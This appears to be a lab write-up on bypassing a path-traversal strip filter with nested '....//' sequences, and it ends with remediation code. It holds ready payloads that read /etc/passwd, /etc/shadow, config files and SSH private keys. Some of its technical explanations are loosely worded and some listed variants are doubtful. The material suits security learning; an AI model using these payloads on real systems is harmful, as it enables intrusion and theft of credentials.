# Path Traversal: Bypassing Strip Filter with Nested Sequences

**Lab:** Retrieve `/etc/passwd` bypassing traversal sequence stripping  
**Challenge:** Application removes `../` from input before using it

---

## Understanding "Strips"

**"Strips" means:** The application **removes/deletes** `../` from your input

### Example

```python
# Vulnerable filter
def sanitize(filename):
    return filename.replace("../", "")  # Removes "../" only ONCE

# Test
user_input = "../../../../etc/passwd"
clean = sanitize(user_input)
# Result: "etc/passwd" ❌ Not what we want!
```

---

## The Problem

**Your input:**
```
../../../../etc/passwd
```

**After stripping:**
```
etc/passwd
```

**Final path:**
```
/var/www/images/etc/passwd  ❌ Wrong directory!
```

---

## The Bypass: Nested Traversal

Since the filter only runs **once**, use **nested sequences** that reconstruct after stripping:

### How It Works

```
Input:     ....//
           │││││
Strip:     . ../ .  →  Remove the middle "../"
           │    │
Result:    ../         ✅ Recreated!
```

### Visual Breakdown

```
....//....//....//....//etc/passwd
  ││  ││  ││  ││
  ▼▼  ▼▼  ▼▼  ▼▼
Remove "../" once from each "....//":
  
....// → ../
....// → ../
....// → ../
....// → ../

Result: ../../../../etc/passwd ✅
```

---

## Exploitation Steps

### Step 1: Identify the Filter

1. Navigate to product images
2. Find image parameter:
   ```
   /image?filename=product.jpg
   ```

3. Test normal traversal:
   ```
   /image?filename=../../../../etc/passwd
   ```
   **Result:** Blocked or returns wrong file

### Step 2: Craft Nested Payload

**Payload:** `....//....//....//....//etc/passwd`

**Breakdown:**
- `....//` = When `../` is removed, leaves `../`
- Repeat 4 times to traverse up 4 directories
- Add target path: `etc/passwd`

### Step 3: Execute Attack

**URL:**
```
/image?filename=....//....//....//....//etc/passwd
```

**What happens:**
```
Input:    ....//....//....//....//etc/passwd
          ↓ (filter strips "../")
Result:   ../../../../etc/passwd
          ↓ (path resolution)
File:     /etc/passwd ✅
```

### Step 4: Verify Success

**Response:**
```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
...
```

---

## Attack Flow

```
┌─────────────────────────────────────────┐
│ 1. Find image parameter                 │
│    /image?filename=product.jpg          │
└────────────────┬────────────────────────┘
                 │
                 ▼
┌─────────────────────────────────────────┐
│ 2. Test normal traversal (fails)        │
│    ../../../../etc/passwd               │
│    Result: Filter strips it             │
└────────────────┬────────────────────────┘
                 │
                 ▼
┌─────────────────────────────────────────┐
│ 3. Use nested sequences                 │
│    ....//....//....//....//etc/passwd   │
└────────────────┬────────────────────────┘
                 │
                 ▼
┌─────────────────────────────────────────┐
│ 4. Filter strips "../" once             │
│    Result: ../../../../etc/passwd       │
└────────────────┬────────────────────────┘
                 │
                 ▼
┌─────────────────────────────────────────┐
│ 5. Path resolves to /etc/passwd ✅      │
│    Lab Solved                           │
└─────────────────────────────────────────┘
```

---

## Alternative Payloads

### Different Nested Patterns

```
....//....//....//....//etc/passwd        (Basic nested)
..././..././..././..././etc/passwd        (Alternative nesting)
....\\\....\\\....\\\etc/passwd           (Windows-style)
....\/....\/....\/etc/passwd              (Mixed slashes)
```

### URL Encoded

```
....%2f....%2f....%2f....%2fetc/passwd
```

### Different Targets

```
....//....//....//....//etc/shadow
....//....//....//....//var/www/html/config.php
....//....//....//....//home/user/.ssh/id_rsa
```

---

## Technical Analysis

### Why Single-Pass Filters Fail

**Vulnerable Code:**
```python
def sanitize(filename):
    # Only runs ONCE - doesn't loop!
    return filename.replace("../", "")

# Example
sanitize("....//")
# Step 1: Find first "../" → Remove it
# "..../" → ".." + "/" → "../"
# Step 2: Function ends (doesn't check again)
# Result: "../" still present!
```

**Secure Code:**
```python
def sanitize(filename):
    # Keep stripping until nothing left to strip
    while "../" in filename:
        filename = filename.replace("../", "")
    return filename

# Example
sanitize("....//")
# Loop 1: "..../" → "../"
# Loop 2: "../" → ""
# Result: "" (all traversal removed)
```

### Pattern Recognition

```
Pattern:    ....//
Position:   012345
            
Find "../" at position 1-3:
Before:  . [ ../ ] .
After:   . + . = ../

The dots around "../" combine to form new "../"!
```

---

## Detection Examples

### What Gets Through

```
✅ ....//           → ../    (after strip)
✅ ..././           → ../    (after strip)
✅ ....\\/          → ../    (after strip)
✅ ....\/           → ../    (after strip)
```

### What Gets Blocked

```
❌ ../              → ""     (stripped completely)
❌ .../             → .../   (no "../" to strip, but invalid)
❌ ..\\             → ..\\   (only strips "../", not "..\")
```

---

## Remediation

### Fix the Filter

**Option 1: Loop Until Clean**
```python
def sanitize(filename):
    while "../" in filename or "..\\" in filename:
        filename = filename.replace("../", "")
        filename = filename.replace("..\\", "")
    return filename
```

**Option 2: Use Regex for All Variations**
```python
import re

def sanitize(filename):
    # Remove all traversal patterns
    patterns = [r'\.\./+', r'\.\.\\/+', r'\.\.\\+']
    for pattern in patterns:
        while re.search(pattern, filename):
            filename = re.sub(pattern, '', filename)
    return filename
```

**Option 3: Whitelist Only (BEST)**
```python
import re

def sanitize(filename):
    # Only allow alphanumeric, dots, dashes, underscores
    if not re.match(r'^[a-zA-Z0-9._-]+$', filename):
        raise ValueError("Invalid filename")
    
    # No traversal sequences at all
    if '..' in filename:
        raise ValueError("Invalid filename")
    
    return filename
```

---

## Complete Solution

### Step-by-Step Commands

```bash
# 1. Original URL
https://lab.com/image?filename=product.jpg

# 2. Test normal traversal (will fail)
https://lab.com/image?filename=../../../../etc/passwd

# 3. Use nested bypass (success!)
https://lab.com/image?filename=....//....//....//....//etc/passwd
```

### Expected Output

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
...
```

---

## Key Concepts

| Concept | Explanation |
|---------|-------------|
| **Strip** | Remove/delete from input |
| **Single-pass** | Filter only runs once |
| **Nested** | Sequences inside sequences |
| **Reconstruction** | After strip, pieces combine to reform `../` |

---

## Quick Reference

**Attack Pattern:**
```
For each "../" you need, use "..../"
Want: ../../../../etc/passwd
Use:  ....//....//....//....//etc/passwd
```

**Why it works:**
```
....// 
  ↓ Strip "../" once
../  
  ✅ Reconstructed!
```

---

## Lab Solution

```
Payload: ....//....//....//....//etc/passwd
Result:  ✓ /etc/passwd retrieved
Status:  LAB SOLVED
```

**Bypass Technique:** Nested Traversal Sequences  
**Filter Weakness:** Single-pass removal  
**Impact:** Arbitrary file read